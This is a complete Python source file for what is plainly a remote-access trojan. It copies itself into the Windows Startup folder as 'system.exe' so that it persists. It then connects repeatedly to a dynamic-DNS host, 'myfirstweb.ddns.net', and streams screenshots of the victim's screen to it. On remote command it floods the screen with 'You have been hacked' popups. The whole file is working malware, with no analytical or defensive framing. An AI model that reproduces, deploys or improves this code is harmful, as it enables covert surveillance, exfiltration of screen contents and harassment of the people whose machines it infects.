import socket
import threading
import mss
import numpy as np
import cv2
import time
import tkinter as tk
import random
import os
import shutil
import sys

def add_to_startup():
    startup_dir = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
    
    exe_path = sys.executable  # Current executable path
    
    dest_path = os.path.join(startup_dir, 'system.exe')
    
    if not os.path.exists(dest_path):
        try:
            shutil.copyfile(exe_path, dest_path)
            pass
        except Exception as e:
            pass

class ScreenClient:
    def __init__(self, host='127.0.0.1', port=9999):
        self.host = host
        self.port = port
        self.sock = None
        self.message_box_active = False
        self.connect_to_server()

    def connect_to_server(self):
        while True:
            try:
                self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.sock.connect((self.host, self.port))
                print(f"Connected to server at {self.host}:{self.port}")

                command_thread = threading.Thread(target=self.receive_commands)
                command_thread.daemon = True
                command_thread.start()

                self.send_screen()
            except (ConnectionRefusedError, socket.error):
                time.sleep(0.5)

    def receive_commands(self):
        while True:
            try:
                command = self.sock.recv(1024)
                if command == b"START_MESSAGE":
                    self.message_box_active = True
                    threading.Thread(target=self.spawn_message_boxes, daemon=True).start()
                elif command == b"STOP_MESSAGE":
                    self.message_box_active = False
            except Exception:
                break

    def send_screen(self):
        with mss.mss() as sct:
            while True:
                try:
                    screen = sct.grab(sct.monitors[1])
                    img = np.array(screen)
                    img = cv2.cvtColor(img, cv2.COLOR_BGRA2BGR)
                    _, buffer = cv2.imencode('.jpg', img, [cv2.IMWRITE_JPEG_QUALITY, 50])
                    self.sock.sendall(len(buffer).to_bytes(4, 'big'))
                    self.sock.sendall(buffer)
                except (ConnectionResetError, BrokenPipeError):
                    print("[!] Lost connection to server, attempting to reconnect...")
                    self.connect_to_server()
                    break

    def spawn_message_boxes(self):
        while self.message_box_active:
            threading.Thread(target=self.create_message_box, daemon=True).start()
            time.sleep(0.2)

    def create_message_box(self):
        if not self.message_box_active:
            return

        root = tk.Tk()
        root.overrideredirect(True)
        root.attributes('-topmost', True)
        label = tk.Label(root, text="You have been hacked", font=("Arial", 10), fg="red")
        label.pack(expand=True, padx=5, pady=5)
        root.update_idletasks()

        window_width, window_height = label.winfo_reqwidth() + 10, label.winfo_reqheight() + 10
        screen_width, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
        x, y = random.randint(0, screen_width - window_width), random.randint(0, screen_height - window_height)
        root.geometry(f"{window_width}x{window_height}+{x}+{y}")

        root.mainloop()

if __name__ == '__main__':
    add_to_startup()  # Add to startup on script execution
    client = ScreenClient(host='myfirstweb.ddns.net')